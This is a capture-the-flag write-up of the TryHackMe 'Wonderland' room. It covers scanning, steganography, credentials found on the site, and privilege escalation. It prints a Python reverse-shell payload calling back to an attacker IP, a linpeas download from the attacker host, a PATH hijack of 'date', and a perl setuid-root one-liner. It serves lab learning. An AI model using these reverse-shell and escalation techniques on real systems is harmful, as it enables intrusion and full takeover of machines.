# TryHackMe - Wonderland - Linux

- [room](https://tryhackme.com/room/wonderland)

## Nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/31%OT=22%CT=1%CU=39160%PV=Y%DS=4%DC=I%G=Y%TM=6245C38
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1
OS:1NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 729.87 seconds
```

## Port 80

- Let's run Gobuster
```
┌──(root💀kali)-[~]
└─# gobuster dir -u http://10.10.229.155/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.229.155/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/31 11:22:01 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/poem                 (Status: 301) [Size: 0] [--> poem/]
/r                    (Status: 301) [Size: 0] [--> r/]   
                                                         
===============================================================
2022/03/31 11:31:29 Finished
===============================================================
```
- On /poem we have The Jabberwocky poem  
![image](https://user-images.githubusercontent.com/96747355/161145799-79de6b1d-0d51-417c-94bd-9538e36b8b73.png)  
- On /r we have nothing interesting
- On /img there are some images
- Let's modify our /etc/hosts and add this `10.10.95.114 wonderland`
- Now we can use gobuster for subdomain enumeration as well (it does not five anything but it was worth a try)
- Let's have a closer look to the images.
- First lets take the rabbit one As it is written pretty much everywhere to follow the white rabbit.
```
┌──(root💀kali)-[~/Documents/tryhackme/wonderland]
└─# steghide --info white_rabbit_1.jpg         
"white_rabbit_1.jpg":
  format: jpeg
  capacity: 99.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "hint.txt":
    size: 22.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```
- It asks for a passphrase but there is no need to enter anything you can just type enter.
- And we can see that a hint is embeded in the image, lets extract it ` steghide --extract -sf white_rabbit_1.jpg`sf will specify it is a stego file.
- Here is the hint
```
┌──(root💀kali)-[~/Documents/tryhackme/wonderland]
└─# cat hint.txt     
follow the r a b b i t                                                                                                                                                                                                               
```
In our gobuster there was an r directory. So this probably means that `r a b b i t` is a path that we need to **follow** 
- Indeed at each page we get the follow up fo the story `http://wonderland/r/a/b/b/i/t/`  
![image](https://user-images.githubusercontent.com/96747355/161146081-674e96f8-0d60-42e5-8a5c-e9511e534a20.png)  
- If we look at the code of the last page we get what seems to be user:pass:
```
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```
- Let's try those on the ssh. It works:
```
alice@wonderland:~$ 
```
- If we check the hint for the user.txt it says everything is upside down so I tried to find a file called `txt.resu` but it was not it, then I realized as we have the root.txt in alice's folder maybe the user.txt is in a the root so I tried a `cat /root/user.txt` 
- And it worked!
- Let's try to become root

## Privilege Escalation

- If we sudo -l using alice password, we get htis
```
alice@wonderland:~$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
- If we l0ok at the python script it seems to show 10 of any sentence of the poem randomly
```
for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```
- Having the right to this specific file means that this the way to privesc.
- It seems like we could hijack the python library. I found [this really interesintg article that explains it pretty well](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)
- So our walrus script uses the library random.py. I modified it like this to get a reverse shell and I launched it as the user rabbit this way: `sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`
```
#!/usr/bin/python3
from os import dup2
from subprocess import run
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.13.22.56",8888)) 
dup2(s.fileno(),0) 
dup2(s.fileno(),1) 
dup2(s.fileno(),2) 
run(["/bin/bash","-i"])
```
- And it works we have a shell as rabbit:  
![image](https://user-images.githubusercontent.com/96747355/161157090-1444f291-a4e1-4efc-8373-2706cd00e399.png)  
- With a shell as rabbit we can now have a look at their home folder and we can see this file called teaParty. If we use file on it we get this result:
```
file teaParty
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
```
If we launch it it ends with a segfault
```
Probably by Thu, 31 Mar 2022 23:15:41 +0000

Welcome to the tea party!
The Mad Hatter will be here soon.
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
```

- Let's take a look at it from our attacking machine as we do not have a the strings function in the target machine
- we can serve it using http server of python as it is installed in the machine `python3.6 -m http.server 8888`
- And we take it using wget  
![image](https://user-images.githubusercontent.com/96747355/161159311-d81208ba-f7c3-4003-88fc-6d4bf0fb104d.png)  
- When we look at it with strings we see this line:
```
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```
- So date is invoked without using the full path, we could certainly abuse this by putting a file called date and make it do something for us.
- Let's just make it run bash using `/bin/bash`  
![image](https://user-images.githubusercontent.com/96747355/161160256-614b80cc-961a-4eaa-ac3d-bfedf16a90bf.png)  
- Now we serve it from our attacking machine with python and get it in our target
- We have to make it executable with `chmod +x`
- And we need to export rabbit's home as our path 
```
export PATH=/home/rabbit:$PATH
echo $PATH
/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```

- And now we can run our binary! And it works  
![image](https://user-images.githubusercontent.com/96747355/161160721-3ceaafc0-f471-4c8a-a62e-30df37f6233c.png)  
- We are the mad hatter!! If we go to his home directory we get his password `WhyIsARavenLikeAWritingDesk?` so we can connect as him using ssh:  
![image](https://user-images.githubusercontent.com/96747355/161160960-8886a779-8272-462f-b804-15015a358b5c.png)  

- There are no specific file that caught our attention and sudo -l does not list anything so let's get linepeas and check out what we could do.
- `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64` we run this in our attacking machine
- We serve it using python server `python3 -m http.server 80`
- We dowload it in our target `wget http://10.13.22.56/linpeas_linux_amd64`
- add it execution right with `chmod +x` and run it ./linpeas_linux_amd64
- We have a 95% PE vector:  
![image](https://user-images.githubusercontent.com/96747355/161161958-102231a7-45a4-4127-85ad-5d2851eef10f.png)  
- [This article](https://gtfobins.github.io/gtfobins/perl/#capabilities) shows us a way to abuse this I slightly modified the command to use bash instead of sh `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'` and it works!  
![image](https://user-images.githubusercontent.com/96747355/161162600-29d8758f-f86a-44b6-a5ee-a591236ba6bb.png)  
- We are root and can read our last flag on alice's home!
